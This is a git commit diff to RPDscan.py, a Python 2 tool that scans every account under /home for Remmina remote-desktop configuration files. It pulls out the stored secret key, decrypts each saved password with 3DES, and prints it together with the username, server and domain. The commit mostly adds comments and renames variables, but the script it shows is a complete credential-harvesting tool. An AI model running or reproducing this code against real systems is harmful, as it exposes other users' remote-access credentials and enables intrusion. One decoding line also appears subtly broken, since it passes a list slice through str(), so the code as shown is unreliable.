a71b0f3b1a8ed63f34786eb65be5993f1a0cd31d
root <root@mint>
2014-04-04 17:05:37 +0100

    made more legible comments/varibles

--- RPDscan.py
+++ RPDscan.py
@@ -4,9 +4,9 @@ import os
 import subprocess
 import re
 
-#### freakyclowns AMES ##################################
-# RPDscan - Remmina Password Decorder/scanner		#				
-#	   						#
+#########################################################
+# RPDscan - Remmina Password Decorder/scanner		#			
+#	by Freakyclown					#
 # This tool searches the /home directory for users      #
 # Remmina preference and config files, then does some   #
 # magic to decode any saved passwords it finds          #
@@ -25,41 +25,64 @@ import re
 
 
 
-def decodewithscience(sekrit,passd):
-	cutsekrit = sekrit.split('=',1)
-	cutpassd = passd.split('=',1)
-	secret = base64.decodestring(str(cutsekrit[1]))
-	password = base64.decodestring(str(cutpassd[1:]))
-	print DES3.new(secret[:24],DES3.MODE_CBC,secret[24:]).decrypt(password)
+def decodewithscience(private_key_line,saved_key_line):
+	## grab the password and the secret key and truncate them on the first = ##
+	private_key = private_key_line.split('=',1)
+	saved_key = saved_key_line.split('=',1)
+	
+	## base 64 decode the private key and the saved password key
+	decoded_private_key =  base64.decodestring(str(private_key[1]))
+	decoded_saved_key = base64.decodestring(str(saved_key[1:]))
+	
+	## do some magic and decode and print out the decoded password \o/
+	print "Saved password: "
+	print DES3.new(decoded_private_key[:24],DES3.MODE_CBC,decoded_private_key[24:]).decrypt(decoded_saved_key)
 
-def findconfs(sek):
+def muchprefsverywow(pref_key):
 
-	remconf = subprocess.Popen("find /home/ -type f -name *.remmina", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+	## open a process to find all the remmina configs ##
+	sub_proc_confs = subprocess.Popen("find /home/ -type f -name *.remmina", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
 
-	for line in remconf.stdout:
-	        with open(line.strip(), 'r') as inF:
-	            for linex in inF:
-	                if 'password' in linex:
-	                        if linex == "password=\n":
-					print "found a conf file", line,
-	                                print "no saved password sorry!"
-	                        else:
-					print "found a conf file", line, 
-					decodewithscience(sek,linex)
-					print ""
-
-def findprefs():
-	rempref = subprocess.Popen("find /home/ -name remmina.pref", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-	for line in rempref.stdout:
-		print "found this pref file", line
-	        with open(line.strip(), 'r') as inF:
-	            for lineb in inF:
-	                if 'secret' in lineb:
-	                        isecret = lineb
-				findconfs(isecret)
-
+        ## for each line do some magic
+        for sub_conf_found in sub_proc_confs.stdout:
+		print "========"
+                with open(sub_conf_found.strip(), 'r') as found_pref:
+		    print "Found a conf file:", sub_conf_found
+                    for conf_secret in found_pref:
+			if 'username=' in conf_secret:
+				print conf_secret
+			if 'server=' in conf_secret:
+				print conf_secret
+			if 'domain=' in conf_secret:
+				print conf_secret
+                        if 'password' in conf_secret:
+                                if conf_secret == "password=\n":
+                                        print "no saved password sorry!"
+                                        print ""
+                                else:
+                                        decodewithscience(pref_key,conf_secret)
+                                        print ""
 
 
-findprefs()
+
+
+def findalltheprefs():
+	## open a new process and do the find ##
+	sub_proc_pref = subprocess.Popen("find /home/ -name remmina.pref", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+
+	## iterate over all the found pref files ##
+	for sub_pref_found in sub_proc_pref.stdout:
+		
+		## tell the user we found something ##
+		print "found this pref file", sub_pref_found
+		
+		## open the pref file and check/grab the users private key
+	        with open(sub_pref_found.strip(), 'r') as found_pref:
+	            for pref_secret in found_pref:
+	                if 'secret' in pref_secret:
+				muchprefsverywow(pref_secret)
+
+
+findalltheprefs()
 
 
